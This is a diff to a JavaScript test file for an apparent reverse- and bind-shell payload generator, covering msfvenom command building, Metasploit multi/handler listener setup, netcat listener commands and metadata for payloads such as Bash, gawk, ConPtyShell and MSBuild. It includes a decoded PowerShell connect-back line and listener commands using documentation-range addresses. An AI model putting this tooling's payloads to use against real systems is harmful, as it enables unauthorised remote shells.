@@ -20,6 +20,8 @@ import {
   MSFVENOM_PAYLOADS,
   generateMsfvenomCommand,
   getMsfvenomCompatibilityErrors,
+  getMsfvenomListener,
+  getMsfvenomPayloadTraits,
   isFormatCompatible,
 } from '../src/data/msfvenomData.js'
 import LINUX_PAYLOADS from '../src/data/payloadsLinux.js'
@@ -30,9 +32,12 @@ import {
   buildPayloadCatalog,
   buildPayloadMetadata,
   inferPayloadCategory,
+  inferPayloadVerification,
   validatePayloadMetadata,
 } from '../src/features/payloadAdvisor/payloadMetadata.js'
 import {
+  getAdvisorCapabilityOptions,
+  getRequirementCapabilityIds,
   rankPayloads,
   requirementIsAvailable,
 } from '../src/features/payloadAdvisor/advisorEngine.js'
@@ -59,6 +64,23 @@ test('injects placeholders inside PowerShell EncodedCommand payloads', () => {
   const decoded = Buffer.from(injected.split(' ').at(-1), 'base64').toString('utf16le')
 
   assert.equal(decoded, '$client.Connect("192.0.2.10",4444)')
+})
+
+test('normalizes legacy Python format-string braces in generated source payloads', () => {
+  const renderedC = injectPayloadValues(LINUX_PAYLOADS.C, '192.0.2.10', '4444')
+  const renderedCSharp = injectPayloadValues(
+    LINUX_PAYLOADS['C# TCP Client'],
+    '192.0.2.10',
+    '4444',
+  )
+  const renderedGo = injectPayloadValues(LINUX_PAYLOADS.Golang, '192.0.2.10', '4444')
+
+  for (const rendered of [renderedC, renderedCSharp, renderedGo]) {
+    assert.doesNotMatch(rendered, /\{\{|\}\}/)
+  }
+  assert.match(renderedC, /int main\(void\)\{/)
+  assert.match(renderedCSharp, /namespace ConnectBack \{/)
+  assert.match(renderedGo, /func main\(\)\{/)
 })
 
 test('validates hosts and ports before payload generation', () => {
@@ -131,6 +153,57 @@ test('quotes user-controlled MSFVenom output values', () => {
   assert.match(command, /-o 'my shell\.exe'/)
 })
 
+test('uses multi/handler for staged and Meterpreter MSFVenom payloads', () => {
+  const stagedShell = getMsfvenomListener({
+    payload: 'linux/x86/shell/reverse_tcp',
+    ip: '192.0.2.10',
+    port: '4444',
+  })
+  assert.match(stagedShell, /use exploit\/multi\/handler/)
+  assert.match(stagedShell, /set PAYLOAD linux\/x86\/shell\/reverse_tcp/)
+  assert.match(stagedShell, /set LHOST 192\.0\.2\.10/)
+  assert.match(stagedShell, /set LPORT 4444/)
+  assert.equal(getMsfvenomPayloadTraits('linux/x86/shell/reverse_tcp').isStaged, true)
+
+  const stagelessMeterpreter = getMsfvenomListener({
+    payload: 'windows/x64/meterpreter_reverse_https',
+    ip: '198.51.100.5',
+    port: '8443',
+  })
+  assert.match(stagelessMeterpreter, /use exploit\/multi\/handler/)
+  assert.equal(
+    getMsfvenomPayloadTraits('windows/x64/meterpreter_reverse_https').isStaged,
+    false,
+  )
+
+  const stagedBind = getMsfvenomListener({
+    payload: 'linux/x64/shell/bind_tcp',
+    ip: '203.0.113.8',
+    port: '5555',
+  })
+  assert.match(stagedBind, /set RHOST 203\.0\.113\.8/)
+  assert.doesNotMatch(stagedBind, /set LHOST/)
+})
+
+test('uses Netcat only for simple stageless command-shell payloads', () => {
+  assert.equal(
+    getMsfvenomListener({
+      payload: 'linux/x64/shell_reverse_tcp',
+      ip: '192.0.2.10',
+      port: '9001',
+    }),
+    'nc -lvnp 9001',
+  )
+  assert.equal(
+    getMsfvenomListener({
+      payload: 'linux/x64/shell_bind_tcp',
+      ip: '192.0.2.20',
+      port: '9002',
+    }),
+    'nc 192.0.2.20 9002',
+  )
+})
+
 test('builds deterministic metadata for fixed and portable shell payloads', () => {
   const bashMetadata = buildPayloadMetadata({
     name: 'Bash -i',
@@ -164,10 +237,84 @@ test('builds valid metadata for every selectable reverse and bind payload', () =
     { payloads: BIND_WINDOWS_PAYLOADS, os: 'Windows', mode: 'bind' },
   ])
 
-  assert.equal(catalog.length, 116)
+  assert.equal(catalog.length, 111)
   assert.equal(new Set(catalog.map(item => item.id)).size, catalog.length)
   assert.equal(catalog.some(item => item.name === 'P0wny Shell (Webshell)'), false)
   assert.deepEqual(catalog.flatMap(validatePayloadMetadata), [])
+  assert.equal(catalog.some(item => item.name === 'PHP exec'), false)
+  assert.equal(catalog.some(item => item.name === 'curl'), false)
+  assert.equal(catalog.some(item => item.name === 'PowerShell #5 (IEX)'), false)
+  assert.equal(catalog.some(item => item.name === 'Mshta'), false)
+  assert.equal(catalog.some(item => item.name === 'Regsvr32'), false)
+  assert.ok(catalog.every(item => item.verification?.status))
+})
+
+test('uses the runtime required by Bash UDP and GNU Awk network payloads', () => {
+  assert.match(LINUX_PAYLOADS['Bash udp'], /^bash -i/)
+  assert.match(LINUX_PAYLOADS.Awk, /^gawk /)
+  assert.match(BIND_LINUX_PAYLOADS['Awk Bind'], /^gawk /)
+
+  const awkMetadata = buildPayloadMetadata({
+    name: 'Awk',
+    template: LINUX_PAYLOADS.Awk,
+    os: 'Linux',
+    mode: 'reverse',
+  })
+  assert.deepEqual(awkMetadata.requiredBinaries, ['gawk'])
+  assert.match(awkMetadata.warnings.join(' '), /GNU Awk/)
+})
+
+test('classifies uncommon compiler payloads as experimental without claiming runtime verification', () => {
+  assert.equal(inferPayloadVerification({ category: 'C' }).status, 'experimental')
+  assert.equal(inferPayloadVerification({ category: 'Bash' }).status, 'conditional')
+
+  const metadata = buildPayloadMetadata({
+    name: 'Runtime verified sample',
+    template: 'bash -c "echo {ip} {port}"',
+    os: 'Linux',
+    mode: 'reverse',
+    overrides: {
+      verification: {
+        status: 'verified',
+        basis: 'Executed in a controlled test fixture.',
+        lastVerified: '2026-08-18',
+        testedOn: ['test-fixture'],
+      },
+    },
+  })
+
+  assert.equal(metadata.verification.status, 'verified')
+  assert.deepEqual(validatePayloadMetadata(metadata), [])
+})
+
+test('offers at least one selectable capability for every catalog requirement', () => {
+  const sourcesByOs = {
+    Linux: [
+      { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
+      { payloads: BIND_LINUX_PAYLOADS, os: 'Linux', mode: 'bind' },
+    ],
+    Windows: [
+      { payloads: WINDOWS_PAYLOADS, os: 'Windows', mode: 'reverse' },
+      { payloads: BIND_WINDOWS_PAYLOADS, os: 'Windows', mode: 'bind' },
+    ],
+  }
+
+  for (const [os, sources] of Object.entries(sourcesByOs)) {
+    const catalog = buildPayloadCatalog(sources)
+    const capabilityIds = new Set(
+      getAdvisorCapabilityOptions(os, catalog).map(option => option.id),
+    )
+
+    for (const payload of catalog) {
+      for (const requirement of payload.requiredBinaries) {
+        assert.equal(
+          getRequirementCapabilityIds(requirement).some(id => capabilityIds.has(id)),
+          true,
+          `${payload.id} has no selectable capability for ${requirement}`,
+        )
+      }
+    }
+  }
 })
 
 test('metadata inference supports explicit overrides and rejects duplicate ids', () => {
@@ -194,7 +341,7 @@ test('metadata inference supports explicit overrides and rejects duplicate ids',
   ]), /Duplicate payload metadata id/)
 })
 
-test('advisor ranks compatible payloads deterministically', () => {
+test('advisor ranks payloads by declared requirements deterministically', () => {
   const catalog = buildPayloadCatalog([
     { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
   ])
@@ -245,6 +392,18 @@ test('advisor transport and category filters only return matching payloads', () 
   assert.ok(results.every(result => result.payload.category === 'Bash'))
 })
 
+test('advisor hides experimental payloads by default and can include them explicitly', () => {
+  const catalog = buildPayloadCatalog([
+    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
+  ])
+  const recommended = rankPayloads(catalog)
+  const all = rankPayloads(catalog, { maturity: 'all' })
+
+  assert.ok(recommended.every(result => result.payload.verification.status !== 'experimental'))
+  assert.ok(all.some(result => result.payload.verification.status === 'experimental'))
+  assert.ok(all.length > recommended.length)
+})
+
 test('builds guided reverse payload explanations with placeholders and stabilization', () => {
   const metadata = buildPayloadMetadata({
     name: 'Bash -i',
@@ -258,6 +417,8 @@ test('builds guided reverse payload explanations with placeholders and stabiliza
 
   assert.deepEqual(extractPayloadPlaceholders(metadata.template), ['ip', 'port'])
   assert.match(explanation.direction, /outbound connection/)
+  assert.equal(explanation.verification.status, 'conditional')
+  assert.match(explanation.verification.basis, /runtime behavior depends/)
   assert.equal(explanation.workflow[0].command, 'nc -lvnp 4444')
   assert.equal(explanation.stabilization.length, 2)
   assert.match(explanation.troubleshooting, /\/dev\/tcp/)
@@ -277,4 +438,24 @@ test('builds bind explanations with the connect command in the correct workflow 
   assert.match(explanation.direction, /opens a listening port/)
   assert.equal(explanation.workflow[1].command, 'nc 192.0.2.10 4444')
   assert.deepEqual(explanation.stabilization, [])
+})
+
+test('marks external-resource and LOLBAS payloads experimental with explicit requirements', () => {
+  const conPtyMetadata = buildPayloadMetadata({
+    name: 'ConPtyShell',
+    template: WINDOWS_PAYLOADS.ConPtyShell,
+    os: 'Windows',
+    mode: 'reverse',
+  })
+  const msBuildMetadata = buildPayloadMetadata({
+    name: 'MSBuild',
+    template: WINDOWS_PAYLOADS.MSBuild,
+    os: 'Windows',
+    mode: 'reverse',
+  })
+
+  assert.equal(conPtyMetadata.verification.status, 'experimental')
+  assert.match(conPtyMetadata.warnings.join(' '), /Downloads a remote resource/)
+  assert.equal(msBuildMetadata.verification.status, 'experimental')
+  assert.ok(msBuildMetadata.requiredBinaries.includes('msbuild.exe'))
 })
